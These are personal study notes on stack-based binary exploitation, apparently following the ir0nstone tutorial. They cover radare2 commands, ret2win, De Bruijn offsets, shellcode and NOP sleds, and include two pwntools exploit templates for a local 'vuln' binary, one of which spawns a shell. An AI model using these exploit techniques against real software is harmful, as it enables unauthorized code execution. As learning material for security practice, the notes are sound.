Resource (ir0nstone)

===Stack==
- Region of memory storing temporary variables created by functions in code.
- Function called -> Memory address pushed into stack. 

Radare2 (Binary reverse-engineering and analysis tool)
r2 -d -A vuln | -d = Runs -A = Analysis
s main; pdf | [s] Seek main, [pdf] Print Disassembly Function
pxw @ esp | Stack view
dr <register> | Show register
EIP (Extended Instruction Pointer) | Points to next instruction

ret2win
1) Identify minimum Offset/padding 
Padding | Offset/padding to cause segmentation fault
2) Target function/memory address
afl (Command) | Analyse Functions List (List functions of binary). 
      - Identify target function to execute and its memory address.
3) Prepare (Overwrite saved return pointer/address that will popped into EIP) 
Overflow and give EIP target memory address.
===============================================================================================
from pwn import *            # pwntools Import

p = process('./vuln')        # Start process

payload = b'A' * 52          # String to bytes because of next line
payload += p32(<<Memory Address>>)   # Target memory address (p32 function returns bytes) - Endianness

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output target string.
===============================================================================================

De Bruijn Sequences (Offset Calculations)
"ragg2 -P 100 -r" generates pattern of length 100 in ascii bytes.
Sequence added when prompted for input and receive address program crashes at.
wopO <Memory Address> | Provides offset.

Shellcode
- Running own instructions
Von Neumann architecture | No differentiation between data and instructions
1) Identify buffer start in memory by inspecting vulnerable function. Example: ; var int32_t var_134h @ ebp-0x134 (Local variable)
2) Add items to buffer and inspect local variable to check whether input is stored there.
px @ ebp-0x134 | Inspect local variable.
3) De Bruijn sequence to find padding (ragg2 -P X -r then wopO `dr eip` or wopO <Memory Address>).

===============================================================================================
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())
payload = payload.ljust(312, b'A')
payload += p32(<<Memory Address>>)

log.info(p.clean())
p.sendline(payload)
p.interactive()
===============================================================================================

NOPs (No operation) Instructions / NOP Sliding
- Removes requirement for attack to jump to a specific address (Example: Overcomes stack randomization)
- Makes target address larger (Target anywhere in the NOPs padding which eventually directs to specific address)
- "In intel x86 assembly, NOP instructions are \x90"
===============================================================================================
b'\x90\x90\x90\x90\x90...<Shellcode><Padding><Memory Address>
===============================================================================================
Stack
============================================================================================================
= |    BUFFER (NOP Slide + Shellcode)   |   EBP   |  RETURN Address  |   ARG   |  ARG  |  Calling Function = 
============================================================================================================


===Heap===



===Kernel=== 
